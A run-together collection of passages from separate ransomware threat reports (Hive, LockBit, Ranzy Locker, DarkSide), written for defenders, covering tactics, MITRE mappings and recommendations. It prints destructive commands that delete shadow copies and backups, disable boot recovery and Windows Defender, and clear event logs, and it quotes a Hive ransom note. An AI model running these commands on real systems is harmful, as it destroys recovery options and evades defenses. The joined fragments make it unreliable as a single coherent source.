the tool, the threat actor acquired the domain devices list and saved the results to a text file named \"domains.txt.\" To\nlocate all live hosts, the attacker executed a Batch script called \"p.bat,\" which looped over the domains list sending pings and saved\nthe results to a text file named \"res.txt.\"\n\n\n\n8/11\n\nThe p.bat script and file naming convention match part of Conti's ransomware toolkit, which was provided to the group's affiliates\nand first leaked on August 21, 2022 and published on Twitter. This indicates that Hive affiliates are adopting other ransomware\ngroup techniques.\n\nImpact\n\nThe threat actors began their final actions by distributing a file named \"windows.exe,\" which was the ransomware payload written in\nGolang. The payload performs multiple operations, including deleting shadow copies, disabling security products, clearing Windows\nevent logs, and closing handles on files to guarantee a smooth encryption process. Below is a brief documentation of the executed\ncommands:\n\nCommand Description\n\nvssadmin.exe delete shadows /all /quiet Deleting the shadow copies from the machine to\ninhibit system recovery\n\nnet.exe stop \"SamSs\" /y Stops the Security Accounts Manager to prevent\nsending alerts to SIEM system\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v\n\"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\n\nDisables Windows Defender to avoid detection\n\nwevtutil.exe cl security Clearing the Windows Security Event Logs\n\nThe ransomware iterates through all the available folders encrypting the included files and drops a ransom note named\n\"_HOW_TO_DECRYPT.txt\" in each folder. Once it has finished encryption, it pops the ransom note to inform the user of the attack.\n\nYour network has been breached and all data were encrypted. \nPersonal data, financial reports and important documents are ready to disclose. \n\nTo decrypt all the data and to prevent exfiltrated files to be disclosed at  \nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd.onion/ \nyou will need to purchase our decryption software. \n\nPlease contact our sales department at: \n\n  http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd.onion/ \n \n     Login:     \n     Password:  \n\nTo get an access to .onion websites download and install Tor Browser at: \n  https://www.torproject.org/ (Tor Browser is not related to us) \n\nFollow the guidelines below to avoid losing your data: \n\n- Do not modify, rename or delete *.key. files. Your data will be  \n  undecryptable. \n- Do not modify or rename encrypted files. You will lose them. \n- Do not report to the Police, FBI, etc. They don't care about your business. \n  They simply won't allow you to pay. As a result you will lose everything. \n- Do not hire a recovery company. They can't decrypt without the key.  \n  They also don't care about your business. They believe that they are  \n  good negotiators, but it is not. They usually fail. So speak for yourself. \n- Do not reject to purchase. Exfiltrated files will be publicly disclosed. \n\nConclusions\n\nRansomware attacks have grown significantly over the past years and remain the preferred method of threat actors aiming to\nmaximize profits. The impact of an attack can be detrimental. It may potentially harm an organization's reputation, disrupt regular\noperations and lead to temporary, and possibly permanent, loss of sensitive data.\n\nAlthough detecting and responding to such incidents can be challenging, most malicious activities can be prevented by having the\nright security tools, incident response plans, and patches for known vulnerabilities in place.\n\nhttps://twitter.com/vxunderground/status/1423336151860002816?s=20\n\n\n9/11\n\nRecommendations\n\nVaronis Forensics Team recommends the following:\n\nPatch Exchange server to the latest Exchange Cumulative Update (CU) and Security Update (SU) provided by Microsoft.\nEnforce the use of complex passwords and require users to change passwords periodically.\nUse the Microsoft LAPS solution to revoke local admin permissions from domain accounts (the principle of least privilege) and\nregularly check for and remove inactive user accounts.\nBlock SMBv1 usage and use SMB signing to protect against pass-the-hash attack.\nRestrict access to the minimum required for the employee's role.\nDetect and automatically prevent access control changes that violate your business rules.\nTrain employees in security principles and make sure employees receive security awareness training as a part of your cyber\nsecurity plans.\nEstablish basic security practices, and set rules of behavior describing how to handle and protect the organization and\ncustomer information and other vital data.\n\nMITRE Breakdown\n\n1.

With LockBit’s\nstrong malware capabilities and affiliate program, organizations should keep abreast of its machinations to effectively spot risks and defend\nagainst attacks.\n\nhttps://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit\n\n\n2/11\n\n View infographic of \"Ransomware Spotlight: LockBit\"\n\nLockBit first emerged as the ABCD ransomware on September 2019, which was improved to become one of the most prolific ransomware\nfamilies today.\n\nThrough their professional operations and strong affiliate program, LockBit operators proved that they were in it for the long haul. Thus, being\nacquainted with their tactics will help organizations fortify their defenses for current and future ransomware attacks.\n\n \n\nWhat do organizations need to know about LockBit?\n\n \n\nLockBit uses a ransomware-as-a-service (RaaS) model and consistently conceived new ways to stay ahead of its competitors. Its double\nextortion methods also adds more pressure to victims, raising the stakes of their campaigns.\n\nOne of its notable tactics was the creation and use of the malware StealBit, which automates data exfiltration. This tool was seen with the\nrelease of LockBit 2.0, the latest known version, which has been touted by its creators for having the fastest and most efficient encryption\namong its competition. In October 2021, LockBit also expanded to Linux hosts, specifically ESXi servers, in its release of Linux-ESXI Locker\nversion 1.0. This variant is capable of targeting Linux hosts and could have a big impact on targeted organizations.\n\nAnother side of LockBit’s operations is its recruitment of and marketing to affiliates. It has been known to hire network access brokers,\ncooperate with other criminal groups (such as the now defunct Maze), recruit company insiders, and sponsor underground technical writing\ncontests to recruit talented hackers. Using such tactics, the LockBit group has built itself into one of the most professional organized criminal\ngangs in the criminal underground.\n\nThe tactics we’ve enumerated are evident in their attack on Accenture in 2021. Experts suspect that an insider helped the group gain access to\nthe firm’s network. LockBit also reportedly published a small part of the stolen data from the attack.\n\nhttps://documents.trendmicro.com/images/TEx/articles/LockBit-Infographic-ZgjRJ0Y.jpg\nhttps://www.trendmicro.com/vinfo/us/security/definition/ransomware\nhttps://www.trendmicro.com/vinfo/us/security/definition/ransomware-as-a-service-raas\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti\nhttps://www.trendmicro.com/en_us/research/21/h/lockbit-resurfaces-with-version-2-0-ransomware-detections-in-chi.html\nhttps://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html\nhttps://www.zdnet.com/article/accenture-says-lockbit-ransomware-attack-caused-no-impact-on-operations-or-clients/\n\n\n3/11\n\nFigure 1. LockBit’s timeline of notable activities\n\nThe impact of LockBit and insights from Water Selkie\n\nOur investigation into the intrusion set behind LockBit, which we track as Water Selkie, reveals the effectiveness and impact of the tactics we\nhave discussed. The key takeaways are the following:\n\nThe malware’s performance is a strong selling point. The malware’s speed and capabilities are widely known because the group\nuses them as selling points. The threat group’s efforts to publicize their malware’s capabilities have established it as the ransomware with\none of the fastest and most efficient encryption methods.\nIt considers external pressures and issues faced by its potential targets. Water Selkie’s operators have indicated a preference for\nvictims in Europe who fear breaching EU’s General Data Protection Regulation (GDPR). They continue to also consider the US to have\nlucrative targets, but see that data privacy laws can affect their chances of getting a successful payout. In general, they are attuned to\ngeopolitical issues that they can use to their advantage.\nBanks on the strength of its affiliate program. As mentioned earlier, a contributing factor in LockBit’s success is how well it recruits\ntrustworthy and capable affiliates. Evidence also suggests that several of its affiliates are involved in multiple RaaS operations, which\nhelps Water Selkie innovate and keep up with its competition. In return, Water Selkie prides itself on its professional operation that can\nbe trusted by affiliates.\nIt has more in store for the future. Water Selkie clearly ramped up operations in the second half of 2021. We see that the intrusion set\nwill either maintain or increase their level of activity in the first half of 2022. Organizations should also expect more supply chain attacks\nin the future according to an interview conducted with one of LockBit’s operators.\n\nWith LockBit affiliates being likely involved in other RaaS operations, its tactics slipping into those of other ransomware groups isn’t a far-\nfetched notion. Organizations would therefore benefit from recognizing LockBit’s tactics, techniques, and procedures (TTPs) laid out in the next\nsections.\n\nTop affected industries and countries\n\nIn this section, we discuss Trend Micro™ Smart Protection Network™ data, which are detections of LockBit attempts to compromise\norganizations. LockBit has been detected all over the globe, with the US seeing most of the attack attempts from June 2021 to January 20,\n2022, followed by India and Brazil. Like many ransomware families LockBit avoids Commonwealth of Independent States (CIS) countries.\n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Fig-01mzI6GLS.png\nhttps://ke-la.com/lockbit-2-0-interview-with-russian-osint/\n\n\n4/11\n\nFigure 2. Countries with the highest number of attack attempts per machine for LockBit ransomware (July 1, 2021 to January 20, 2022)\n Source: Trend Micro™ Smart Protection Network™ infrastructure\n\nWe saw the most LockBit-related detections in the healthcare industry followed by the education sector.  LockBit threat actors have claimed\nthat they do not attack healthcare, educational, and charity institutions. This “contradictory code of ethics,” has been noted by the US\nDepartment of Health Services (HHS) who warns the public not to rely on such statements as these tend to dissolve in the face of easy\ntargets.\n\nFigure 3. Industries with the highest number of attack attempts per machine for LockBit ransomware (July 1, 2021 to January 20, 2022)  \n Source: Trend Micro Smart Protection Network infrastructure\n\nOverall, we saw increased LockBit-related activity following the release of LockBit 2.0, peaking in November 2021.\n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-02.jpg\nhttps://www.avertium.com/blog/an-in-depth-look-at-lockfile-and-lockbit\nhttps://www.healthcareitnews.com/news/hhs-cybersecurity-agency-sounds-alarm-lockbit-ransomware-variant\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-03.jpg\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-04.jpg\n\n\n5/11\n\nFigure 4. LockBit monthly detections per machine (July 1, 2021 to January 20, 2022) \nSource: Trend Micro Smart Protection Network infrastructure\n\nTargeted regions and sectors according to LockBit leak site\n\nIn this section, we examine the number of attacks recorded on LockBit’s leak site, which represents successfully compromised organizations\nwho, as of writing, have refused to pay ransom. In our foray into the leak site of LockBit operators from December 16, 2021 to January 15,\n2022, we observed that they had the highest number of recorded victims among active ransomware groups at 41, followed by Conti at 29. Do\nnote, however, that LockBit has been accused of artificially inflating the number of their victims.\n\nLooking into the list of their victims, it appears that more than half of the organizations are based in North America, followed by Europe and\nAsia Pacific.\n\nFigure 5. Regional distribution of LockBit victims according to the group’s leak site (December 16, 2021 to January 15, 2022)\n\nLockBit targets organizations indiscriminately, in that their victims come from many different sectors compared to other groups. In the\nabovementioned time period, they have victims coming from financial, professional services, manufacturing, and construction sectors, just to\nname a few. The majority of LockBit’s victims have been either small or small and medium-size businesses (SMBs) – 65.9% and 14.6%\nrespectively, with enterprises only comprising 19.5%. That’s at odds with a group like Conti who victimized 44.8% of enterprises and 34.5%\nSMBs, and only victimized 20.7% of small businesses.\n\nFigure 6. Sector distribution of LockBit victims according to the group’s leak site (December 16, 2021 to January 15, 2022)\n\nIn our observation of the activities within the LockBit leak site for the same time period, majority of attacks took place during weekdays,\napproximately 78% of the total, while 22% happened during the weekend.\n\nInfection chain and techniques\n\nOperating as a RaaS, LockBit infection chains show a variety of tactics and tools employed, depending on the affiliates involved in the attack.\nAffiliates typically buy access to targets from other threat actors, who typically obtain it via phishing, exploiting vulnerable apps, or brute forcing\nremote desktop protocol (RDP) accounts. \n\nHere are some of the observed infection flows of LockBit variants:\n\nhttps://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-conti\nhttps://www.lemagit.fr/actualites/252510802/Ransomware-comment-la-franchise-LockBit-20-gonfle-artificiellement-ses-chiffres\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-05-AbR9MlRO.jpg\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-06-ALHcCGRx.jpg\n\n\n6/11\n\nFigure 7.

A LockBit 1.0 campaign that used Meterpreter to perform command and control after gaining access to the system\n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-05.jpg\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-06.jpg\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-07.jpg\n\n\n7/11\n\nFigure 10. A LockBit 1.0 campaign that did not involve any network scanning as it directly deployed the payload after gaining access to the\nsystem\n\nFigure 11. LockBit 2.0 infection chain that uses StealBit for automated data exfiltration\n\n \n\nInitial Access\n\nLockBit operators mostly gain access via compromised servers or RDP accounts that are usually bought or obtained from affiliates.\nIn some instances, it arrived via spam email or by brute forcing insecure RDP or VPN credentials.\nIt can also arrive via exploiting Fortinet VPN’s CVE-2018-13379 vulnerability.\n\n \n\nExecution\n\nLockBit is usually executed via command line as it accepts parameters of file path or directories if desired to only encrypt specific paths.\nIt may also be executed via created scheduled tasks. This is usually the case if it is propagated in other machines.\nThere are also reports of it being executed using PowerShell Empire, a pure PowerShell post-exploitation agent.\n\n \n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-08.jpg\nhttps://documents.trendmicro.com/images/TEx/articles/RS-LockBit-Figure-09.jpg\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-13379\n\n\n8/11\n\nCredential Access\n\nAside from using credentials obtained from affiliates. LockBit attacks were also observed using Mimikatz to further gather credentials.\n\n \n\nDefense Evasion\n\nSome infections were observed to have GMER, PC Hunter, and/or Process Hacker. These are tools that are usually used to disable\nsecurity products.\nIn some observed attacks, a Group Policy was created to disable Windows Defender.\n\n \n\nDiscovery\n\nNetwork Scanner, Advanced Port Scanner, and AdFind were also used to enumerate connected machines in the network. Probably to\nlocate the Domain Controller or Active Directory server as these are usually the best targets for deploying ransomware with network\nencryption or propagation.\n\n \n\nLateral Movement\n\nLockBit can self-propagate via SMB connection using obtained credentials.\nSome samples can self-propagate and execute via Group Policy.\nIn some instances, PsExec or Cobalt Strike were used to move laterally within the network.\n\n \n\nExfiltration\n\nUploads stolen files via cloud storage tools like MEGA or FreeFileSync.\nSometimes, the StealBit malware (also sold by the threat actors) was used instead to exfiltrate stolen files.\n\n \n\nImpact\n\nThe ransomware payload will proceed with encryption routine upon execution. Encryption includes both local and network encryption.\nIt encrypts files using AES and encrypts AES key with RSA encryption. The AES Key is generated using BCryptGenRandom.\nFor faster encryption, it only encrypts the first 4KB of a file and appends it to “.lockbit.”\nIt will also replace the desktop wallpaper with a note that includes a statement where it tries to recruit insiders or affiliates within\ncompanies.\n\n\n\n9/11\n\nFigure 12. Sample wallpaper used by LockBit\n\nLockBit also sends a WoL packet to ensure that network drives are active for its network encryption; this behavior was first observed on\nthe Ryuk ransomware.\nLockBit also has the capability to print its ransom note using connected printers using WinSpool APIs, which is probably inspired by\nEgregor ransomware.\n\nMITRE tactics and techniques\n\nInitial\nAccess Execution Persistence Privilege Escalation Defense Evasion Discovery\n\nLateral\nMovement Exfiltrat\n\nT1566 -\nPhishing\n\n Arrives via\nphishing\nemails \n\nT1190 -\nExploit\npublic-facing\napplication\n\n Arrives via\nany the\nfollowing\nexploits:•\nCVE-2018-\n13379\n\nT1078 - Valid\naccounts\n\n Has been\nreported to\nmake use of\ncompromised\naccounts to\naccess\nvictims via\nRDP or VPN\n\nT1106 -\nExecution\nthrough API\n\n Uses native\nAPI to\nexecute\nvarious\ncommands/\nroutines\n\nT1059  -\nCommand\nand\nscripting\ninterpreter\n\n Uses\nvarious\nscripting\ninterpreters\nlike\nPowerShell\nand\nWindows\ncommand\nshell \n\nT1204 -\nUser\nexecution\n\n User\nexecution is\nneeded to\ncarry out\nthe payload\nfrom the\nspear\nphishing\nlink or\nattachments\n\nT1547  -\nBoot or\nlogon\nautostart\nexecution\n\nCreates\nregistry run\nentries\n\nT1134 - Access token\nmanipulation\n\nUse AdjustTokenPrivilege\nAPI to modify token attribute\nto\nSE_PRIVILEGE_ENABLED \n\n \nT1548 - Abuse Elevation\nControl Mechanism\n\n Makes use of \nucmDccwCOMMethod in\nUACME, a github collection\nof UAC bypass techniques\n\nT1140 - Deobfuscate/Decode\nFiles or Information\n\n Strings to be used\nthroughout the routine are\nencrypted using XOR or\nSubtraction.\n\nT1562 - Impair defenses\n Disables security related\n\nservices via terminating\nthem.

Organizations\ntherefore should also keep abreast of the latest shifts that could influence their own security measures.  \n\n \n\nTo help defend systems against similar threats, organizations can establish security frameworks that can allocate resources systematically for\nestablishing a solid defense against ransomware. \n\n \n\nHere are some best practices that can be included in these frameworks:\n\n \n\nAudit and inventory\n\nTake an inventory of assets and data \nIdentify authorized and unauthorized devices and software \nMake an audit of event and incident logs \n\n \n\nConfigure and monitor\n\nManage hardware and software configurations \nGrant admin privileges and access only when necessary to an employee’s role \nMonitor network ports, protocols, and services \nActivate security configurations on network infrastructure devices such as firewalls and routers \nEstablish a software allow list that only executes legitimate applications \n\n \n\nPatch and update\n\nConduct regular vulnerability assessments\nPerform patching or virtual patching for operating systems and applications \nUpdate software and applications to their latest versions \n\n \n\nProtect and recover\n\nImplement data protection, backup, and recovery measures \nEnable multifactor authentication (MFA) \n\n \n\nSecure and defend\n\nEmploy sandbox analysis to block malicious emails \nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network \nDetect early signs of an attack such as the presence of suspicious tools in the system \nUse advanced detection technologies such as those powered by AI and machine learning\n\n \n\nTrain and test\n\nRegularly train and assess employees on security skills \nConduct red-team exercises and penetration tests\n\nA multilayered approach can help organizations guard the possible entry points into the system (endpoint, email, web, and network). Security\nsolutions can detect malicious components and suspicious behavior could help protect enterprises.\n\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools\nearly on before the ransomware can do irreversible damage to the system.\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities. This\nprotection is made possible through techniques such as virtual patching and machine learning.\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block\nmalicious emails, including phishing emails that can serve as entry points for ransomware.\n\nhttps://www.trendmicro.com/en_us/business/products/detection-response.html\nhttps://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-workload-security.html\nhttps://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/email-inspector.html\n\n\n11/11\n\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats\nand ransomware, ensuring the protection of endpoints.\n\nIndicators of Compromise (IOCs)\n\nThe IOCs for this article can be found here.

Essentially, Ranzy is a rebranded and improved version of the ThunderX\nransomware. Since a free decryption tool of ThunderX is released, Ranzy Locker has been\nreleased by the threat actors. Note that the Tor onion URL used by Ranzy was the same as\nthe one previously used by the Ako ransomware. So, it is also a successor of Ako.\n\nRanzy threat actors also have established a Ransomware as a Service (RAAS) model and\nutilize the double extortion tactic. In other words, they exfiltrate critical data before encrypting\nfiles and threaten the victim with the release of the exfiltrated data to encourage ransom\npayment.\n\nAccording to the flash report of the FBI,  the Ranzy Locker ransomware gang had\ncompromised over 30 businesses in the U.S. alone as of July 2021. Victims of ransomware\nare in various sectors, such as manufacturing, government, transformation, and IT.\n\nhttps://www.picussecurity.com/resource/blog/a-detailed-walkthrough-of-ranzy-locker-ransomware-ttps\nhttps://www.ic3.gov/Media/News/2021/211026.pdf\n\n\n2/8\n\nWe provide the tactics, techniques, and procedures (TTPs) used by the Ranzy Locker threat\nactors in this blog post because detecting and blocking a threat's TTPs is the most effective\nmethod of preventing that threat. TTPs enable us to identify potential intrusions and analyze\nthe behavior of threat actors.\n\nTactics, Techniques, and Procedures (TTPs) used by Ranzy Locker\nRansomware\n\nThis section presents the malicious behaviors of the Ranzy Locker ransomware group. Our\nanalysis uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge\n(ATT&CK®) version 10 framework. See the ATT&CK Matrix for Enterprise v10 for all\nreferenced tactics and techniques.\n\n1. Initial Access\n\nThe Initial Access tactic includes techniques used by attackers to gain an initial foothold\nwithin a network, such as exploiting vulnerabilities on public-facing web servers.\n\n1.1. ATT&CK T1190 Exploit Public-Facing Application \n\nRanzy Locker operators leverage known Microsoft Exchange Server vulnerabilities to\ncompromise target systems.\n\n1.2. ATT&CK T1566 Phishing\n\nThe Ranzy Locker ransomware is also distributed via phishing campaigns.\n\n1.3. ATT&CK T1078 Valid Accounts\n\nThe ransomware gang leverages valid accounts with Remote Desktop Protocol (RDP) to\naccess target systems.\n\n2. Execution\n\n \nThis tactic includes techniques that result in adversary-controlled code running on a local or\nremote system. The execution technique cannot be detached from other techniques; it is\noften paired with techniques from all other tactics. \n\n2.1. MITRE ATT&CK T1106 Native API\n\nAdversaries can execute behaviors directly through the native OS application programming\ninterface (API). The Ranzy Locker ransomware leverages Windows API for a variety of\noperations, such as enumerating shared resources, as explained below.\n\n3. Defense Evasion\n\nhttps://attack.mitre.org/versions/v10/\n\n\n3/8\n\nDefense evasion techniques are used by adversaries to avoid detection by security controls.\n\n3.1. ATT&CK T1027 Obfuscated Files or Information\n\nThe Ranzy Locker ransomware uses Base64 encoding to obfuscate its configuration in the\nransom note.\n\n3.2. ATT&CK T1497 Virtualization/Sandbox Evasion\n\nAdversaries may use a variety of techniques to detect and avoid virtualization and analysis\nenvironments. This may include altering behavior in response to the detection of artifacts\nindicative of a virtual machine (VM) environment or sandbox. If the adversary detects a VM\nenvironment, they may modify their malware in order to disengage from the victim or conceal\nthe implant's core functions. The Ranzy locker ransomware group uses IsDebuggerPresent\n API call to detect debuggers by checking if a program is running in debugging mode.\n\n4. Credential Access\n\n4.1. ATT&CK T1110 Brute Force\n\nThe ransomware gang acquires valid accounts through brute force.\n\n5. Discovery\n\nAdversaries use the techniques in the Discovery tactic to obtain information about the target\nenvironment, such as services, processes, network, files, software, system, accounts,\ndomain, and registry.\n\n5.1. ATT&CK T1083 File and Directory Discovery\n\nThe Ranzy Locker ransomware discovers critical files to exfiltrate, such as customer data,\npersonally identifiable information (PII) files, and financial records. It uses GetLogicalDrives\nAPI call to enumerate all mounted drives, as also used by the Ryuk ransomware.\n\n5.2. ATT&CK T1135 Network Share Discovery\n\nRanzi utilizes NetShareEnum API call for discovering shared resources, such as SMB\nnetwork shares, to encrypt files stored in these resources. This API call is also used by the\nConti ransomware. It also sends ARP broadcast requests for network device lookup.\n\n5.3. ATT&CK T1057 Process Discovery\n\nAdversaries get information about running processes to understand software and\napplications running on the system and shape follow-on behaviors. Ranzy uses Windows\nNative API calls to enumerate running processes.\n\n5.4. ATT&CK T1120 Peripheral Device Discovery\n\nhttps://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/\nhttps://blogs.vmware.com/security/2020/07/tau-threat-discovery-conti-ransomware.html\n\n\n4/8\n\nThe Ranzy Locker ransomware scans all drive letters to infect USB drives.\n\n5.5. ATT&CK T1018 Remote System Discovery\n\nRanzy reads the host file (C:\\Windows\\System32\\drivers\\etc\\hosts) to discover the hostname\nto IP address mappings of remote systems.\n\n5.6. T1082 System Information Discovery\n\nThe ransomware queries the volume information to determine the disks in the system.\n\n6. Impact\n\nThe Impact tactic covers techniques that manipulate, interrupt, or destroy your systems to\ndisrupt availability, compromise integrity, or cover a confidentiality breach.\n\n6.1. ATT&CK T1490 Inhibit System Recovery\n\nRanzy Locker ransomware attacks utilize multiple procedures to inhibit system recovery:\n\nFirst, it disables shadowcopy notifications using wmic.exe, a command-line utility to\naccess Windows Management Instrumentation (WMI)\n\nWMIC.exe  SHADOWCOPY /nointeractive \n\nWbadmin is a built-in Windows tool that allows you to backup and restore your\noperating system, volumes, files, folders, and programs. Ranzy Locker uses wbadmin\nto delete system state backups with the following command:\n\nwbadmin DELETE SYSTEMSTATEBACKUP\n\nIt also uses a more specific version of this command to delete the oldest system state\nbackup:\n\nwbadmin DELETE SYSTEMSTATEBACKUP - deleteOldest\n\nBCDEdit is a command-line tool for managing Boot Configuration Data (BCD) stores\nthat are used to describe boot applications and boot application settings. Ranzy Locker\nuses bcdedit.exe twice to disable automatic Windows recovery features by modifying\nboot configuration data with the following commands, which are also used by REvil\n(Sodinokibi) and Nefilim ransomware families.\n\nbcdedit /set {default} recoveryenabled No\n\nbcdedit /set {default} bootstatuspolicy ignoreallfailures\n\nhttps://www.picussecurity.com/resource/blog/a-brief-history-and-further-technical-analysis-of-sodinokibi-ransomware?hsLang=en-gb\nhttps://www.picussecurity.com/resource/blog/how-to-beat-nefilim-ransomware-attacks?hsLang=en-gb\n\n\n5/8\n\nvssadmin (Volume Shadow Copy Service Admin) is another native Windows tool that\ncan display current volume shadow copy backups and all installed shadow copy writers\nand providers. The Ranzy Locker ransomware abuses vssadmin.exe with the following\ncommand to delete all volume shadow copies on the system to prevent recovery, as\nalso used by REvil (Sodinokibi).\n\nvssadmin.exe Delete Shadows /All /Quiet\n\nREAD our blog post titled \"An Underrated Technique to Delete Volume Shadow Copies -\nDeviceIoControl\" to learn more about four methods used by ransomware threat groups to\nprevent the recovery of encrypted files from volume shadow copies.\n\n6.2. ATT&CK T1486 Data Encrypted for Impact\n\nThreat actors may encrypt data on target systems or on a large number of systems\nconnected to a network to disrupt the system and network resource availability. They can\nmake stored data unusable by encrypting files or data on local and remote drives, which is a\ncommon behavior of ransomware.\n\nRanzy uses the following encryption schemes. \n\nSalsa20 to encrypt files.\nRSA to encrypt Salsa20 keys.\n\nSalsa20 is a faster encryption algorithm than RSA. So, they encrypt files with Salsa20, but\nencrypt the Salsa20 keys with a more secure but slower RSA 2048 bits encryption. This\ncombination is also used by the recent BlackMatter ransomware.\n\nUnfortunately, there is not a public Ranzy Locker ransomware decryption tool as of today.\n\nRanzy Locker creates a readme.txt file that includes the following instruction.  It explains that\nthe files were encrypted and stolen. So, Ranzy is double extortion ransomware like\nDarkSide.\n\nhttps://www.picussecurity.com/resource/blog/a-brief-history-and-further-technical-analysis-of-sodinokibi-ransomware?hsLang=en-gb\nhttps://www.picussecurity.com/resource/blog/technique-to-delete-volume-shadow-copies-deviceiocontrol?hsLang=en-gb\nhttps://www.picussecurity.com/resource/blog/blackmatter-ransomware-analysis-ttps-and-iocs?hsLang=en-gb\nhttps://www.picussecurity.com/resource/whitepaper/illuminating-darkside-ransomware?hsLang=en-gb\n\n\n6/8\n\nThe Tor onion URL in the ransom note includes a live chat to learn detailed instructions for\nbuying the decryption key.\n\n\n\n7/8\n\nHow Picus Helps Simulate and Prevent the Ranzy Locker\nRansomware\n\nWe strongly suggest simulating the Ranzy Locker ransomware to test the effectiveness of\nyour security controls using the Picus Security Control Validation Platform.

      "plain_text": "1/8\n\nShedding Light on the DarkSide Ransomware Attack\nsecurityintelligence.com/posts/darkside-oil-pipeline-ransomware-attack/\n\nCISO May 10, 2021\nBy Limor Kessem 7 min read\nIt has been well over a decade since cybersecurity professionals began warning about both\nnation-state and financially motivated cyber-kinetic attacks. Concerned about a cybersecurity\nthreat that would have the potential to destroy physical assets and human lives, many looked\n\nhttps://securityintelligence.com/posts/darkside-oil-pipeline-ransomware-attack/\nhttps://securityintelligence.com/category/topics/ciso-corner/\nhttps://securityintelligence.com/author/limor-kessem/\nhttps://en.wikipedia.org/wiki/Stuxnet\n\n\n2/8\n\nto sound the alarm in industrial organizations, tracking the vulnerabilities that could lead to a\ncompromise in operational technology networks.\n\nA variety of attacks in that realm took place over the years, whether launched in nation-state\nconflicts across the globe or as an apparent amateur challenge. Most recently,\ncybercriminals who deploy ransomware targeted a large U.S. refined products pipeline\nsystem, causing disruption to its operations and making headlines across the world. The\nattack reportedly only affected IT networks but had the potential to spread to operational\nzones and upstream to the overall supply chain — an attack scenario that could be much\nmore damaging.\n\nUnlike many attacks on industrial organizations that have been connected to adversarial\nnation-states, it seems that the pipeline attack might be a cybercrime case motivated by a\nlarge bounty. The group suspected in this hit goes by the name “DarkSide.”\n\nIBM Security X-Force data shows that ransomware has become the number one threat type\nX-Force responded to in 2020 accounting for 23% of actual attacks that impacted\norganizations. Of those, our incident response data shows 59% of attacks were double-\nextortion cases, where in addition to having their data encrypted, victims were also\nthreatened with data being leaked unless they paid for a decryption key by a specified\ndeadline.\n\nX-Force incident response data further shows that ransomware attacks were the most\ncommon threat to organizations that use operational technology (OT) in 2020. Sectors we\nexamined in our data include manufacturing, oil and gas, transportation, utilities,\nconstruction, and mining, where ransomware attacks accounted for 33% of all attacks we\nresponded to. This trend suggests that threat actors may be finding organizations with OT\nnetworks to be particularly attractive for ransomware attacks precisely because of the costly\ndowntime and impact on a wider ecosystem and on individual consumers.\n\nWho is on the DarkSide?\n\nIn August 2020, a new ransomware gang announced its entry into the cybercrime arena. In\nno less than a “press release” of sorts, its operators declared they had developed the perfect\nransomware tool because other codes they used in the past were not up to the task. The\npost appeared on the group’s TOR domain where the newcomers also advised they were not\ninexperienced cybercriminals and acted as former affiliates to other successful gangs,\nmaking millions of dollars in the process. The malware itself has small similarities to the\nGandCrab and Sodinokibi ransomware, as does the ransom note’s template. Another\nsimilarity is that DarkSide is designed to avoid computers where a language layout\ncorresponds with one of 17 countries from the former Soviet Union, adding Syrian Arabic —\nanother similarity to Sodinokibi. When looking for affiliates to join their ranks, tech-savvy\nRussian speakers need apply. They further stress that they are not interested in “English\n\nhttps://www.wired.com/story/russian-hackers-attack-ukraine/\nhttps://www.darkreading.com/attacks-breaches/water-utility-hack-could-inspire-more-intruders/d/d-id/1340163\nhttps://www.ibm.com/security/data-breach/threat-intelligence\nhttps://www.torproject.org/\nhttps://securityintelligence.com/posts/sodinokibi-revil-ransomware-disrupt-trade-secrets/\n\n\n3/8\n\nspeaking personalities.”  DarkSide has also noted that while they plan to target\norganizations, they would aim for those who ‘can pay’ and spare healthcare, schools, non-\nprofits, and government.\n\nNew Group, Old TTPs\n\nLike other gangs that operate modern ransomware codes, such as Sodinokibi and Maze,\nDarkSide blends crypto-locking data with data exfiltration and extortion. If they are not initially\npaid for a decryption key, the attackers threaten to publish confidential data they stole from\nthe victim and post it on their dedicated website, DarkSide Leaks, for at least 6 months.\nWhen a ransom note appears on an encrypted networked device, the note also\ncommunicates a TOR URL to a page called “Your personal leak page” as part of the threat\nthat if the ransom is not paid, data will be uploaded to that URL. Ransom is demanded in\nBitcoin or Monero. If it is not paid by a specific initial deadline, the amount doubles.\n\nFigure 1: A “Welcome to the Dark” ransom note\n\nA favorite entry point appears to be connecting via RDP on port 443 typically routing via a\nTOR browser. This is concurrent with a trend X-Force has been observing in similar attacks\non organizational networks where attackers opt to scan and exploit targets rather than using\ncompromised credentials.\n\nMimikatz and Cobalt Strike are part of the DarkSide attackers’ arsenal. 